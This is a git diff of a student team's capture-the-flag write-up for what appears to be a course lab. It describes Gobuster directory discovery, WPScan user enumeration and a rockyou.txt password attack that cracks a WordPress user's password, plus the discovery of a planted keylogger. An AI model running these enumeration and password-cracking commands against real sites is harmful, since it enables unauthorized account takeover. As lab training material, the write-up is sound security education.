@@ -5,7 +5,7 @@
 - Joel Han
 - Yucheng Zhang
 
-## Unsolved chanllenges:
+## Unsolved challenges:
 
 - Challenge 4: All your base64 are belong to us.
 
@@ -20,7 +20,6 @@
 ### Gobuster: Find hidden files and web directories
 
 Gobuster helped us solve several challenges by finding hidden files and directories that we couldn’t see just by browsing the site.
-
 Before we explain how we solved each challenge, we’ll first show Gobuster outputs. These gave us clues like secret admin pages, robots.txt, .git, and cs40 homeworks that led us to the flags.
 
 ```
@@ -67,6 +66,9 @@ Finished
 ```
 
 ### WPScan: WordPress Security Scanner
+
+wpscan is a WordPress vulnerability scanner — it’s a command-line tool used to scan WordPress websites for known security issues.
+We first used WPScan to scan the server to identify vulnerabilities.
 
 ```
 $ wpscan --url http://3.145.206.16
@@ -284,8 +286,6 @@ uggcf://cnhytenunz.pbz/tbbtyr.ugzy
 
 This problem is very straightforward. The string `xrl{4n247351p63n867os26q505q095p37284rsp3802087onpnp363n418184pp7506}`match the pattern of `key{xxxxxx}`. With rot13-decoder (https://cryptii.com/pipes/rot13-decoder), the text is decoded and and the key `key{4a247351c63a867bf26d505d095c37284efc3802087bacac363a418184cc7506}` is revealed
 
-#### Screenshot of flag
-
 <img src="rotten.png" alt="Rotten Image" width="70%">
 
 ## Challenge 2: I hope I didn't make this too easy: another flag is on the blog.
@@ -467,37 +467,52 @@ Location of the flag will have something to do with Bo Bo
 
 ### Method
 
+#### Enumerate usernames with WPScan
+
+Withi WPScan, we identified two users: `admin` and `bobo`
+
 ```
+[i] User(s) Identified:
+
+[+] admin
+ | Found By: Author Posts - Display Name (Passive Detection)
+ | Confirmed By:
+ |
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |
+[+] bobo
+ | Found By: Author Posts - Display Name (Passive Detection)
+ | Confirmed By:
+ |
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+```
+
+#### Crack passwords for admin and bobo
+
+```
+
 $ wpscan --url http://3.145.206.165 --passwords rockyou.txt --usernames admin,bobo
+
+```
+
+`admin`'s password was not cracked, but we got bobo's password: `Football`
+
+```
 
 [+] Performing password attack on Wp Login against 2 user/s
 [SUCCESS] - bobo / Football
-Trying admin / contraviento Time: 04:24:04 <==                                                                                                  > (689415 / 28702202)  2.40%  ETA: ??:??:??
+Trying admin / contraviento Time: 04:24:04 <== > (689415 / 28702202) 2.40% ETA: ??:??:??
 [!] Valid Combinations Found:
- | Username: bobo, Password: Football
+| Username: bobo, Password: Football
+
 ```
 
 Using username as `bobo` and Password as `Football`, I successfully logged in `http://3.145.206.165/wp-login.php`.
 <img src="login.png" alt="Login page" width="60%">
 
-And I found the flag in DashBoard.
-
-#### Screenshot of flag
+And I found the flag in DashBoard:
 
 # ![bobo flag](bobo_flag.png)
-
-#### Exact Location
-
-The location of the flag was saved as a draft in bobo's login dashboard.
-
-#### Method
-
-Used WPScan to identify three users: admin, bobo, and Bo Bo
-
-wpscan --url http://3.145.206.165 --passwords rockyou.txt --usernames admin,bobo,Bo Bo --api-token XXXXXX
-
-Once the password was cracked we used the credentials: bobo, Football
-on the wp-login page http://3.145.206.165/wp-login.php to login as bobo.
 
 ## Challenge 11: XSS gone sinister. (Joel Han)
 
@@ -522,10 +537,10 @@ looked strangely out of place... so doing what a curious person should do: we du
 After some digging, we concluded it was used to log user keystrokes!
 
 After understanding that, we tested going to http://3.145.206.165/logger.php, since that's where it looked like everything was
-being directed to. To our surprise, we were met with a blank page didn't find anything noteable until inspecting the page...  
+being directed to. To our surprise, we were met with a blank page didn't find anything noteable until inspecting the page...
 information on JohnHoder's Javascript Keylogger GitHub.
 
-After finding the GitHub, we saw some information on how the logger worked and where it was sesnding information to be stored.  
+After finding the GitHub, we saw some information on how the logger worked and where it was sesnding information to be stored.
 But to where? Process of elimination... If it's not the .js or data.php file, it's probably the data.txt file right?
 
 Lo and behold - after plugging in http://3.145.206.165/data.txt, the key was listed there (along with a lot of other
@@ -589,3 +604,7 @@ Packets in pcap file are all malformed
 ## Lessons Learned
 
 ## Conclusions
+
+```
+
+```
